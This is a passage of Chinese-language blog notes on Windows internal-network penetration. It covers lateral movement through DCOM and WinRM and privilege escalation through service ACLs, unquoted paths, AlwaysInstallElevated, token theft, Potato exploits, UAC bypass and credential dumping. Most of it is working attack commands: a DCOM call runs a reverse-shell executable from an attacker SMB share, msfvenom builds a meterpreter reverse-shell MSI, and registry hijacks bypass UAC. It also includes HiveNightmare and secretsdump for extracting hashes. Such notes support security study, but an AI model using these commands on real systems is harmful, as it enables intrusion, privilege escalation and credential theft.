<p><code>DCOM(分布式组件对象模型)</code><br>
DCOM是基于COM的一系列概念和程序接口支持组件之间跨主机通信。</p>
<p>DCOM是COM的拓展, 允许应用程序实例化和访问远程主机上的COM对象的属性和方法。</p>
<p>DCOM通过RPC技术将COM的功能拓展到本地之外,因此远程主机上托管COM服务端的软件可以通过PRC技术想客户端公开其方法。</p>
<p><strong>7.2 通过DCOM横向移动</strong><br>
https://cloud.tencent.com/developer/article/1902580</p>
<pre><code>Get-CimInstance Win32_DCOMApplication   
#列出计算机上全部的DCOM组件
</code></pre>
<p>DCOM组件公开的接口中可能包含不安全的方法:</p>
<p>MMC20.Application提供的ExecuteShellCommand方法可以在单独的进程中运行指定的程序或命令</p>
<p>目前常用的DCOM组件:</p>
<p>MMC20.Application,ShellWindows,Excel.Application,ShellBrowserWindow…</p>
<p><code>与远程主机的DCOM交互的条件:</code></p>
<p>1.拥有管理员权限的powershell<br>
2.远程主机防火墙关闭</p>
<p><code>1.MMC20.Application利用：</code></p>
<pre><code>python3 smbserver.py evilsmb pwd -smb2support -username 1 -password 1
 
powershell.exe -exec bypass -Command &quot;$om = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','192.168.52.138'));com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c \\192.168.52.138\evilsmb\reverse_http_80.exe','Minimized')&quot;
 
 #获取对象
$com = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','127.0.0.1'));

#查看对象方法：
$com.Document.ActiveView | Get-Member

$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c calc.exe','Minimized')
</code></pre>
<p><code>2.ShellWindows</code></p>
<pre><code>$com = [activator]::CreateInstance([type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39','127.0.0.1'));
 
$com.item().Document.Application | Get-Member

$com.item().Document.Application.ShellExecute('cmd.exe','/c calc.exe','C:\Windows\System32',$null,0)
</code></pre>
<p>ShellWindows组件提供了Document.Application.ShellExecute方法可以启动子进程来运行指定的程序或系统命令</p>
<p>oleviewdotnet：https://github.com/tyranid/oleviewdotnet/releases<br>
ShellWindows对象没有ProgID, 可以通过工具oleviewdotnet根据组件名获取到对象的CLSID,然后在ps中通过GetTypeFromCLSID函数创建对象实例。</p>
<p><code>3.ShellBrowserWindow</code></p>
<pre><code>$com = [activator]::CreateInstance([type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880','127.0.0.1'));

$com.Document.Application.ShellExecute('cmd.exe','/c calc.exe','C:\Windows\System32',$null,0);
</code></pre>
<p>ShellBroswerWindow中也存在一个Document.Application.ShellExecute方法,和ShellWindows一样, 但不会创建新进程, 而是通过已有的explorer.exe来托管子进程。该方法只适用于Win10和WinServer2012等系统版本</p>
<h1 id="8-winrm-的利用">8 WinRM 的利用</h1>
<p>WinRM通过WS-Management协议(用于远程管理软硬件的web协议)使用5985端口实现远程连接, 在开启WinRM服务后防火墙会自动方向相关端口从而让远程主机对其进行远程管理(WinServer2008以上的服务器中WinRM才会自启动)。使用WinRM横移需要有远程主机的管理员凭据信息(账号密码)。<br>
<strong>8.1 通过WinRM执行远程命令</strong><br>
1.Winrs<br>
Windows远程管理提供的客户端程序, 运允许通过提供的用户凭据, 在允许WinRM的服务器上执行系统命令。要求双方都安装WinRM服务,使用WS-Management.</p>
<pre><code>winrm set winrm/config/client @{TrustedHosts=&quot;192.168.52.138&quot;}
#将目标主机添加到TrustedHosts列表
 
powershell -exec bypass -Command &quot;Set-Item WSMan:localhost\client\trustedhosts -value *&quot;  
#通过powersehll将所有主机加入到TrustedHosts
 
winrs.exe -r:http://192.168.30.14:5985 -u:administrator -p:adminDC#@123 &quot;whoami&quot;
 
#winrs.exe -r:http://:5985 -u:administrator -p: &quot;&quot;  #执行命令
</code></pre>
<p>2.Winrm(Winrm.cmd)<br>
内置管理命令行工具, 允许管理员配置本机的WinRM服务</p>
<p>默认无法通过Winrm连接到目标系统,</p>
<p>1.传输为HTTPS或目标位于TrustedHosts列表中并且提供了显式凭据</p>
<p>2.使用winrm.cmd配置TrustedHosts(列表中的计算机可能未经过身份验证,相关设置方法通过winrm help config查看)</p>
<pre><code>winrm.exe invoke create wmicimv2/win32_process -SkipCAcheck -skipCNcheck @{commandline=&quot;cmd.exe&quot;} -r:http://ip:5985 -u:administrator -p:adminDC#@123
</code></pre>
<p><strong>8.2 通过WinRM获取交互式会话</strong><br>
1.Powersehll下的利用</p>
<p>PowerShell的远程传输协议基于WinRM规范, 同时提供了强大的远程管理功能。</p>
<p>Enter-PSSession的PowerShell Cmdlet可以启动与远程主机的会话。在会话交互期间, 用户输入的命令在远程计算机上运行, 就像直接在远程计算机上输入一样。</p>
<p>跳板机上执行下面命令:</p>
<p><code>1.跳板机与远程主机建立会话连接</code></p>
<pre><code>$User = 'H0CKSR\Administrator' #指定远程系统用户名
$Password = ConvertTo-SecureString -String 'adminDC#@123' -AsPlainText -Force    #指定用户密码
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password #将用户名和密码整合以便导入Credential
New-PSSession -Name WinRMI -ComputerName  -Credential Cred -Port 5985
 
# -Name 指定创建的会话名称
# -ComputerName 指定要连接的主机IP或主机名
# -Credential 指定有权连接到直接的用户凭据
# -Port 指定WinRM工作端口
</code></pre>
<p><code>2.跳板机在ps中执行Get-PSSession命令查看当前已创建的PSSession会话</code></p>
<p><code>3.跳板机通过ps命令选中任意一个会话进入交互模式</code><br>
第一种就是获取交互:</p>
<pre><code>Enter-PSSession -Name WinRM1  
</code></pre>
<p>第二种就是直接执行命令来加载payload：</p>
<pre><code>$User = 'H0CKSR\Administrator' #指定远程系统用户名
$Password = ConvertTo-SecureString -String 'adminDC#@123' -AsPlainText -Force    #指定用户密码
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password #将用户名和密码整合以便导入Credential
$Sess = New-PSSession -Name WinRMI -ComputerName  -Credential Cred -Port 5985
Invoke-Command -SessionSess -ScriptBlock {  dir c:\ }
 
# -Name 指定创建的会话名称
# -ComputerName 指定要连接的主机IP或主机名
# -Credential 指定有权连接到直接的用户凭据
# -Port 指定WinRM工作端口
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[内网渗透体系建设--第4章--权限提升]]></title>
        <id>https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-quan-xian-ti-sheng/</id>
        <link href="https://dydydy123.github.io/post/nei-wang-shen-tou-ti-xi-jian-she-di-2-zhang-quan-xian-ti-sheng/">
        </link>
        <updated>2023-04-08T02:40:00.000Z</updated>
        <content type="html"><![CDATA[<h1 id="1查找内核漏洞">1.查找内核漏洞</h1>
<p><code>systeminfo</code>收集本机补丁消息。<br>
<strong>1.1 wes-ng 查找可用漏洞：</strong></p>
<pre><code>python3 wes.py --update

python3 wes.py sysinfo.txt --impact &quot;Elevation of Privilege&quot;
# --impact指定漏洞类型为提权漏洞

python3 wes.py sysinfo.txt --impact &quot;Elevation of Privilege&quot; --exploits-only
#查找有公开exp，结果后面附有链接
</code></pre>
<h1 id="2系统服务提权">2.系统服务提权</h1>
<p>用户安装的一些应用软件会在本地注册一些服务，并且大多数服务在计算机开机时以系统SYSTEM权限启动。应用软件在注册服务时，在以下路径中创建相应的注册表项。</p>
<pre><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services

reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services
#注册表下面有很多个表项, 每条表项分别对应一个服务, 默认情况下系统就有上百条系统服务表项数据, 查询本地安装服务表项数据:
</code></pre>
<p><code>注册表编辑器：regedit</code></p>
<p><strong>2.1不安全的服务权限：</strong><br>
ACL定义了安全对象的访问控制策略，用于规定那些主体对其拥有访问权限或其他权限。<br>
windows的系统服务通过ACL来指定用户对其的权限。<br>
<img src="https://dydydy123.github.io/post-images/1680934605756.png" alt="" loading="lazy"></p>
<p>假如目标主机的用户在配置服务时存在疏忽，使低权限用户对高权限下运行的系统服务拥有更改服务配置的权限（SERVICE_QUERY_CONFIG 或 SERVICE_ALL_ACCESS），就可以通过低权限用户直接修改服务启动时的二进制文件路径。</p>
<p>AccessChk可以枚举目标主机上存在权限缺陷的系统服务。<br>
低权限用户可检查<code>INTERACTIVE</code>（所有经过身份验证的用户，包含系统中所有使用用户名，密码登录并通过验证的用户，不包括来宾账号）和<code>Authenticated Users</code>（交互式用户组，直接登录到计算机进行操作的用户）组对系统服务的权限。默认情况下，这两个组为计算机本地<code>USER</code>组的成员</p>
<pre><code>accesschk64.exe /accepteula -uwcqv &quot;INTERACTIVE&quot; *    # 查询INTERACTIVE组可修改配置的服务
accesschk64.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *    # 查询Authenticated Users组可修改配置的服务
 
sc config &lt;Server Name&gt; &lt;BinfilePath Cloumn&gt;= &quot;cmd.exe /k &lt;EvilFilePath&gt;&quot;   # 修改服务启动文件为恶意文件路径/命令

#sc config InsproSvc binpath= &quot;cmd.exe /k C:\Users\Public\reverse_tcp.exe&quot;   #binpath=后面必须有一个空格
 
#重启服务(需要SERVICE_STOP 或 SERVICE_START权限)，无权限可重启计算机。
sc stop &lt;Service Name&gt;    
sc start &lt;Service Name&gt;

</code></pre>
<p><strong>2.2不安全的服务注册表权限：</strong><br>
Windows注册表中存储了每个系统服务的条目, 而注册表使用ACL来管理用户对其拥有的访问权限。<br>
如果注册表ACL配置出错, 使低权限用户对服务的注册表有写入权限,因此可以通过修改注册表来修改服务配置</p>
<p><code>不安全的服务提权是ACL权限配置错误导致服务配置修改权限分配到了低权限用户手中</code><br>
<code>不安全的服务注册表项是ACL权限配置错误导致注册表表项修改权限分配到了低权限用户手中</code></p>
<pre><code>accesschk64.exe /accepteula -uvwqk  &quot;INTERACTIVE&quot; HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services #查询当前用户具有写入权限的注册表项
 
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\&lt;Server Name&gt; /v ImagePath /t REG_EXPAND_SZ /d &quot;cmd.exe /k &lt;EvilFilePath&gt;&quot; /f    #修改注册表项的ImagePath字段(也可能是其他字段和类型,看具体的服务配置修改)
 
 #查询用户组对服务是否有重启权限
accesschk64.exe /accepteula -ucqv &quot;&lt;UserGroup Name&gt;&quot; &lt;Server Name&gt;    
accesschk64.exe /accepteula -ucqv &quot;INTERACTIVE&quot; &lt;Server Name&gt;   
accesschk64.exe /accepteula -ucqv &quot;Authenticated Users&quot; &lt;Server Name&gt;
 
#重启服务
sc stop &lt;Service Name&gt;    
sc start &lt;Service Name&gt;
</code></pre>
<p><strong>2.3不安全的服务路径目录权限：</strong><br>
如果一个低权限用户,对此服务调用的二进制文件所在目录具有写入权限,可将该文件替换为攻击载荷,并随着服务的启动继承系统权限.</p>
<pre><code>accesschk64.exe /accepteula -quv &quot;&lt;ServerFilePath&gt;&quot;
accesschk64.exe /accepteula -quv &quot;%SystemRoot%\system32\&quot;
 #查看服务的二进制文件目录关于全部用户组的权限分配情况,如果接的是一个目录那就会分别列出该目录下全部目录和文件对各个用户组的权限分配情况
accesschk64.exe /accepteula -quv &quot;&lt;ServerGroupName&gt;&quot; &quot;&lt;ServerFilePath&gt;&quot;
 #查看服务的二进制文件目录关于指定用户组的权限分配情况
 
 #重启计算机
shutdown -r -t 0
 
#重启服务
sc stop &lt;Service Name&gt;    
sc start &lt;Service Name&gt;
</code></pre>
<pre><code>利用：
1.直接将二进制文件替换为恶意程序让系统以system权限执行完成提权

2.在二进制文件目录下写入或者替换动态链接库文件进行dll劫持, system身份加载代码

这种情况就是一个个服务慢慢找了

从服务项注册表中找到全部服务程序所在目录路径
检查Authenticated Users,INTERACTIVE,当前用户所在的其他用户组, 这三个用户组对文件夹目录是否有控制权限
筛选出有控制权限的目录
进入有控制权限的服务目录替换二进制文件或者dll文件
这个要干的活稍微麻烦一点, 主要是要一个个服务查找到对应的二进制文件目录, 然后再检查当前用户对目录的控制权限是否有写入权限, 这点手工活不少, 不过可以参考下面未引用的服务路径直接wmic查看全部服务的PathName然后取出该字段, 再写个bat或ps脚本逐行执行上面accesschk64.exe用户组的权限检测, 最后输出满足要求的服务目录
</code></pre>
<p><strong>2.4不安全的未引用的服务路径：</strong><br>
如果完整路径中包含空格且未有效包含在引号中，那么对于该路径中的每个空格，windows都会按照从左到又的顺序尝试寻找并执行与空格钱的名字相匹配的程序。</p>
<pre><code>wmic service get DisplayName, PathName, StartMode|findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot; 
#查询不带&quot;来指定二进制文件路径的服务
 
accesschk64.exe /accepteula -quv &quot;&lt;UserGroupName&gt;&quot; &quot;&lt;DirFromServer&gt;&quot;    
#查找带空格提前解析的目录有没有写入权限


sc create &lt;servicename&gt; binpath=&quot;\&quot;path\&quot;&quot;
#sc创建系统服务时，应有效的对存在空格的服务路径使用引号包裹。

</code></pre>
<h1 id="3powerup">3.PowerUp</h1>
<pre><code>Set-ExecutionPolicy RemoteSigned
Import-Module PowerUp.ps1
invoke-allchecks
</code></pre>
<h1 id="4msi安装策略提权">4.MSI安装策略提权</h1>
<p>MSI安装策略提权是由于用户配置MSI安装时启动了“永远以高特权进行安装”（默认禁用），使得任意权限的用户都能通过system权限安装MSI程序。此时测试人员可在目标主机上安装预先制作的MSI文件得到SYSTEM权限。</p>
<p><strong>4.1确认系统是否存在漏洞</strong><br>
关键在于用户启动“永远以高特权进行安装”选项后，系统会自动在注册表的以下两个位置创建键值“1”</p>
<pre><code>HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
</code></pre>
<p>可通过以下命令查看值：</p>
<pre><code>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
</code></pre>
<p><strong>4.2 创建恶意MSI并安装</strong></p>
<pre><code>msfvenom -p windows/meterpreter/reverse_http LHOST=csServerIp LPORT=ListenPort -f msi -o reverse_tcp.msi    
#生成反弹shell的msi安装程序
 
msiexec /quiet /qn /i reverse_http_80.msi   
#使用系统自带的安装应用msiexec运行msi程序，/quiet安装其间禁止向用户发送消息；/qn，无gui模式允许；/i常规安装
</code></pre>
<h1 id="5访问令牌操纵">5.访问令牌操纵</h1>
<p>通常, 通过操纵访问令牌, 使正在运行的进程看起来是其他进程的子进程或属于其他用户所启动的进程. 这常常使用内置的API从指定的进程中复制访问令牌, 并将得到的访问令牌用户现有进程或新生成的进程/线程, 以达到权限提升并绕过访问控制的目的. 这个过程就成为令牌窃取.</p>
<pre><code>Win32 API	说明
OpenProcess	根据提供的进程id获取指定进程的句柄
OpenProcesToken	获取与指定进程相关联的访问令牌的句柄
DuplicateTokenEx	复制现有的访问令牌以创建一个新的访问令牌, 包括创建主令牌或模拟令牌
ImPersonateLoggedOnUser	调用线程来模拟登录用户的访问令牌的安全上下文
CreateProcessWithTokenW	创建一个新进程以及主线程, 新进程在指定令牌的安全上下文中运行
CreateProcessAsUserA	创建一个新的进程以及主线程, 新进程在由指定令牌表示的用户的安全上下文中运行
</code></pre>
<p>令牌窃取只能在特权用户上下文中才能完成, 因为通过令牌创建进程使用的CreateProcessWithTokenW和CreateProcessAsUserA两个WindowsAPI分别要求用户必须拥有SeImpersonatePrivilege和SeAssignPrimaryTokenPrivilege/SeIncreaseQuotaPrivilege特权, 而拥有这两个特权的用户一般为系统管理员账户, 网络服务账户和系统服务账户(如IIS,MSSQL等)</p>
<p><strong>5.2Metasploite窃取令牌</strong></p>
<pre><code>load incognito          #导入incognito令牌窃取模块
list_tokens -u          #查看可被1窃取令牌的用户
impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;    #窃取账户令牌
steal_token  &lt;PID&gt;        #从指定进程中窃取令牌
</code></pre>
<p><strong>5.3 通过令牌获取TrustedInstaller权限</strong></p>
<p>在Windows系统中, SYSTEM是最高权限, 但是即便获取SYSTEM权限也不能修改Windows系统文件(例如C:\Windows\Servicing目录即便是SYSTEM权限也不能对其写入)</p>
<pre><code>icacls &quot;C:\Windows\servicing&quot;  #查看目录的权限分配

NT Serivice\TrustedInstaller账户对C:\Windows\servicing这个目录有完全控制的权限

从WindowsVista开始系统内置了一个TrustedInstaller安全主体, 拥有修改系统文件权限, 专门对系统进行维护、更新等操作.TrustedInstaller以一个账户组的形式出现, 即NT Serivice\TrustedInstaller

TrustedInstaller本身是一个服务, 在开启时会运行程序C:\Windows\servicing\TrustedInstaller.exe, 这个程序的拥有者为NT Serivice\TrustedInstaller所以测试人员可以通过窃取TrustedInstaller.exe程序的token以提升到TrustedInstaller权限

</code></pre>
<pre><code>#开启TrustedInstaller，记录pid
sc start TrustedInstaller

#获取指定pid令牌
steal_token 1052

#getuid还是SYSTEM但是可以向C:\Windows\servicing中写入文件，及获取了Serivice\TrustedInstaller用户令牌。
upload /tmp/2.txt C:\\Windows\\servicing
</code></pre>
<h1 id="6potato-家族提权">6.Potato 家族提权</h1>
<p><strong>6.1 Rotten Potato配合Metasploite窃取令牌</strong><br>
Potato通过操纵访问令牌, 可以将已获取的windows服务账户权限提升到SYSTEM权限</p>
<p>使用限制: 和token窃取一样, 需要用户有SeAssignPrimaryPrivilege或SeImpersonatePrivilege特权</p>
<p>Potato家族正是通过滥用Windows服务账户拥有这两个特权权限, 将已获取的SYSTEM账户的访问令牌传入CreateProcessWithTokenW或CreateProcessAsUserA<br>
<img src="https://dydydy123.github.io/post-images/1681118044541.png" alt="" loading="lazy"><br>
<img src="https://dydydy123.github.io/post-images/1681118053880.png" alt="" loading="lazy"><br>
烂土豆的利用原理:</p>
<p>通过GoGetInstanceFromIstorage API,将一个COM对象(BITS)加载到本地可控端口(TCP 6666), 并诱骗BITS对象以SYSTEM账户的身份向该端口发起NTLM验证<br>
借助本地RPC 135端口, 对BITS对象的认证过程实施中间人攻击, 同时调用相关的API为SYSTEM账户在本地生成一个访问令牌</p>
<pre><code>直接执行以下命令会发现没有SYSTEM
load incognito
list_tokens -u

execute -cH -f &quot;rottenpotato.exe&quot;  #Meterpreter运行烂土豆程序
 
load incognito #导入incognito模块用于窃取token
list_tokens -u #查看当前可窃取的token(成功的话在执行rottenpotato之后可以看到SYSTEM可被窃取)
impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;  #窃取SYSTEM用户token
</code></pre>
<p><strong>6.2 juicy Potato</strong><br>
操作步骤：</p>
<p>上传Juicy Potato的利用程序</p>
<p>根据系统操作版本选择一个可用的COM对象</p>
<p>这个步骤就是烂土豆的拓展, 在RottenPotato中默认选择的是BITS对象, 这个可用对象的CLSID根据脚本获得, 不同的系统有哪些SLID可以参考CLSID</p>
<p>执行Juicy Potato程序加载可用的COM对象获取SYSTEM权限并运行指定payload程序反弹shell</p>
<pre><code>#运行clsid.ps1将全部clsid输出到CLSID.list文件中
powershell -ep bypass .\clsid.ps1 &gt; CLSID.list

#可以将可用的CLSID全部输出到result.log文件中
1.bat

juicypotato.exe -t t -p shell.exe -l 6666 -n 135 -c {clsid}

</code></pre>
<p><code>clsid.ps1</code></p>
<pre><code>New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null
$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}} | where-object {$_.appid -ne $null}
foreach($a in $CLSID)
{
	Write-Host $a.CLSID
}
</code></pre>
<p><code>1.bat</code></p>
<pre><code>@echo off
:: Starting port, you can change it
set /a port=9999
SETLOCAL ENABLEDELAYEDEXPANSION

FOR /F %%i IN (CLSID.list) DO (
  echo %%i !port!
  juicypotato.exe -z -l !port! -c %%i &gt;&gt; result.log
  set RET=!ERRORLEVEL!
  :: echo !RET!
  if &quot;!RET!&quot; == &quot;1&quot;  set /a port=port+1
)
</code></pre>
<p><strong>6.3 PrintSpoofer (Pipe Potato)</strong></p>
<pre><code>PrintSpoofer64.exe -i -c whoami
</code></pre>
<p><strong>6.4 Sweet Potato</strong><br>
集成工具含几种提权方式用于获取SYSTEM权限</p>
<p>Rotten Potato<br>
Juicy Potato<br>
RogueWinRMPrintSpoofer</p>
<p>链接：<br>
https://github.com/CCob/SweetPotato</p>
<h1 id="7bypass-uac">7.Bypass  UAC</h1>
<p>介绍：</p>
<p>用户帐户控制（User Account Control，简写作UAC)是微软公司从Windows Vista版本操作系统开始采用的一种控制机制。</p>
<p>原理：<br>
界面操作是：通过询问用户是否授权给应用程序，使用硬盘驱动器和系统文件的权力。以达到阻止恶意程序（“恶意软件”）损坏系统的效果。</p>
<p>内部逻辑是：</p>
<p>在触发 UAC 时，操作系统会创建一个consent.exe进程，用来确定是否创建具有管理员权限的进程（通过白名单和用户选择判断），然后creat process。请求进程将要请求的进程cmdline和进程路径，通过LPC接口传递给appinfo的RAiLuanchAdminProcess函数，该函数首先验证路径是否在白名单中，并将结果传递给consent.exe进程，该进程验证被请求的进程签名，以及，发起者的权限，是否符合要求，然后决定是否弹出UAC框，让用户确认。这个UAC框会创建新的安全桌面，遮挡之前的界面。同时这个UAC框进程是SYSTEM账户的进程，其他标准用户进程无法与其通信交互。用户确认之后，会调用CreateProcessAsUser函数，以管理员权限启动请求的进程。</p>
<p>所以，病毒木马想要实现高权限操作，就不得不绕过UAC弹窗，在没有通知用户情况下, 悄悄地将普通权限，提升为管理员权限启动进程，从而使程序得到高权限的操作。</p>
<p><strong>7.1白名单绕过UAC：</strong><br>
<code>步骤</code></p>
<pre><code>1.找到UAC白名单程序
2.检查程序有没有什么我们可控的额外加载项(示例中ComputerDefault.exe默认加载HKCU\Software\Classes\ms-settings\shell\open\command注册表项程序)
3.UAC程序加载的程序我们是否可控(上面的注册表普通用户权限就可以修改, 这点是很重要的,最佩服的就是示例中的作者能够发现这个一般权限可控的注册表)
4.引导UAC程序加载我们的恶意程序拿到一个管理员会话
5.使用管理员会话使用CS的csv-exe功能或者Meterpreter的getsystem程序拿到SYSTEM权限会话
</code></pre>
<p>白名单有个共同特点：就是Manifest中的autoElevate数据为true</p>
<pre><code># 查找白名单程序
sigcheck.exe -accepteula -m C:\Windows\System32\*.exe   
#输出System32下面全部应用的Manifest数据
strings.exe -accepteula -s C:\Windows\System32\*.exe |find /i &quot;&lt;autoElevate&gt;true&lt;/autoElevate&gt;&quot;   
#输出System32下面全部应用的Manifest数据过滤autoElevate为True的程序

# ComputerDefault.exe默认程序应用+修改注册表提权demo:
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d &quot;C:\temp/reverse_http_80.exe&quot; /f  
#修改ComputerDefault加载的注册表指向的程序
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /d &quot;C:\temp/reverse_http_80.exe&quot; /f 
#修改ComputerDefault加载的注册表指向的程序
ComputerDefault.exe 
#执行程序,因为UAC白名单以管理员身份启动,然后加载注册表程序反弹管理员会话
</code></pre>
<p>这里使用process Monitor监听ComputerDefaults.exe,发现它会去查询HKCU\Software\Classes\ms-settings\Shell\Open\command里面的值。那么我们创建一个HKCU\Software\Classes\ms-settings\Shell\Open\command路径，再对ComputerDefaults.exe进行监听尝试，然后发现他还会去查询HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute，而且Result显示的是NAME NOT FOUND，那么可以认为首先去查询HKCU\Software\Classes\ms-settings\Shell\Open\command路径下的注册表，再去查询HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute是否存在。那么这里创建一个DelegateExecute的键值对，然后把默认键值对指向cmd程序进行尝试<br>
<img src="https://dydydy123.github.io/post-images/1681196234310.png" alt="" loading="lazy"><br>
<img src="https://dydydy123.github.io/post-images/1681196591009.png" alt="" loading="lazy"></p>
<p><strong>7.2.DLL劫持</strong><br>
当应用加载DLL时，如果没有指出DLL的绝对路径，那么程序会在指定路径下搜索待加载的DLL，</p>
<p>DLL动态链接库的搜索路径加载顺序：<br>
在开启DLL安全搜索模式(XP SP2之后默认开启)的情况下:</p>
<pre><code>程序安装目录
系统目录(C:\Windows\System32)
64位系统目录(C:\Windows\System)
Windwos目录(C:\Windows)
当前工作目录
Path环境变量列出的目录
</code></pre>
<p>只要我们放置的dll程序在原本应加载的dll文件之前被加载到(dll文件需要同名), 就可以完成dll劫持, 但是一般这些目录我们都是不可写的, 所以需要结合模拟可信任目录进行利用。</p>
<p><strong>7.3可信任目录</strong><br>
UAC白名单程序请求自动提升权限的过程:</p>
<pre><code>系统读取程序mainFest信息中的autoElevate属性字段值,如果为True则说明是可自动提升权限的程序
系统检查程序的签名(这就意味着不能将UAC程序替换为paylaod程序)
系统检查程序是否位于可信任目录中(如C:\Windows\System32目录)
</code></pre>
<p>为了绕过检查：</p>
<pre><code>模拟可信任目录主要的攻击点就是在第三部可信任目录上, 
例如上面提到C:\Windows\System32目录是一个可信任目录, 
那么我们就可以使用一个`C:\Windows \System32目录作为模拟可信任目录(在Windows后面多了一个空格),
原理就是在系统检查的时候会自动去处目录中的空格。
</code></pre>
<p>利用模拟可信任目录进行DLL劫持步骤：</p>
<pre><code>1.strings列出SYSTEM32下的白名单程序
2.检查白名单程序是否有调用DLL，使用Process monitor添加过滤规则
(可以添加Process Name或者PID将其修改为对应的程序名或者PID)
然后查看列表中出现的加载了的dll文件名(加载注册表的发现也可以通过这种方式寻找, 
如果是寻找注册表方法的话难点就需要有扎实的注册表功底,
 需要知道哪些注册表是一般用户令牌即可修改才行, 或者最头铁的就是直接一个个reg /add语句测试了)
3.将表名单程序赋值到虚拟可信任目录
4.将构造好带有相同导出函数的DLL改名后放到复制后的同一目录下(可用ExportsToC++, AheadLib)
5.运行虚拟可信任目录的白名单程序
</code></pre>
<p><strong>7.4 相关工具</strong></p>
<p><code>7.4.1 UACME：</code><br>
项目及其介绍：</p>
<pre><code>克隆 UACME 项目到本地后，使用 VS2019 进行编译，然后运行即可。
例如以下命令，表示使用 UACME 里的第 62 个方法进行 ByPassUAC，执行成功后，就会直接弹出管理员窗口，没有弹窗提示。
akagi.exe [key] [param]  #key指定需要使用的方法编号;param指定绕过UAC之后执行的程序或命令,默认启动一个关闭UAC之后的CMD窗口

https://github.com/Apri1y/UACME 
18年的项目, 在README中详细介绍了47种利用方式以及它的可利用起止版本(里面的unfix看看就行, 
还是要自己尝试, 毕竟项目比较老了)且有已编译好的exe可直接使用(但是一落地就会被杀, 
倒是里面的工具UacInfo64.exe还挺好用的,
 直接列出CLSID的对象说明以及可以dll劫持的白名单程序)

https://github.com/hfiref0x/UACME 
17年的项目, 在README中的使用demo编号高达61,但是没有太多编号对应的漏洞介绍

https://github.com/dotfornet/UACME 
16年的项目, 在README中有23个利用方式,
且对每个利用方式都要描述且说了从哪个版本(Fixed)
</code></pre>
<p><code>7.4.2 msf：</code><br>
msf中集成了十几个可用的bypassuac模块, 直接通过search bypassuac即可搜索查看<br>
成功利用后得到一个关闭了UAC保护的Meterpreter，如何执行getsystem命令可提权。<br>
未绕过时：<br>
<img src="https://dydydy123.github.io/post-images/1681222560845.png" alt="" loading="lazy"><br>
以绕过时：<br>
<img src="https://dydydy123.github.io/post-images/1681222687776.png" alt="" loading="lazy"></p>
<h1 id="8用户凭据操作">8.用户凭据操作：</h1>
<p><strong>8.1 枚举 Unattended 凭据：</strong></p>
<pre><code>msfconsole
use post/windows/gather/enum_unattend
set session &lt;SessionID&gt;
run
</code></pre>
<p>无人值守(Unattended)安装允许引用程序在不需要管理员关注下自动安装。<br>
无人值守安装的问题可能会在系统中残留一些配置文件,<br>
在里面有可能含有用户的账号和密码, 一般的配置残留文件有这些：</p>
<pre><code>C:\sysprep.inf
C:\syspreg\sysprep.xml
C:\syspreg\system32\sysprep.inf
C:\syspreg\system32\sysprep\sysprep.xml
 
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
 
C:\Windows\system32\Sysgrep\Unattend.xml
C:\Windows\system32\Sysgrep\Panther\Unattend.xml
</code></pre>
<p><strong>8.2 获取组策略凭据：</strong></p>
<pre><code>msfconsole
use /windows/gather/credentials/gpp
set session &lt;sessionID&gt;
run
</code></pre>
<p>微软在Windows Server 2008 中引入了组策略首选项, 允许网络管理员对指定计算机和用户配置特定的设置</p>
<p>在新建一个组后, 控制器会在SYYVOL共享目录下生成一个xml文件, 改文件保留了组策略更新后的密码。</p>
<p><code>SYSVOL是在安装活动目录时创建的一个用于存储公共文件服务器副本的共享文件夹, 主要存放登录脚本,组策略数据以及其他域控制器需要的域信息等, 并在所有结果身份验证的域用户或者域信任用户范围内共享</code></p>
<p>在SYSVOL目录中可以找到一个名为Groups.xml的文件,其中的cpassword字段保存了经过AES 256加密后的用户密码, 微软在2012年公布了加密秘钥, 这就意味着域内用户都可以读取Groups.xml中的密码并使用公开的秘钥进行解密。且由于通过组策略批量修改的本地管理员密码都是相同的, 这就意味着拿到一台机器的本地管理员密码就拿到了域控账户进而通过域管账户拿下整个域。</p>
<p><strong>8.3HiveNightmare</strong></p>
<pre><code>#执行漏洞程序导出有关SAM的三个表
HiveNightmare.exe 

#从导出的SAM中拿到用户哈希
python3 secretsdump.py -sam SAM-haxx -system SYSTEM-haxx -security SECURITY-haxx LOCAL  
</code></pre>
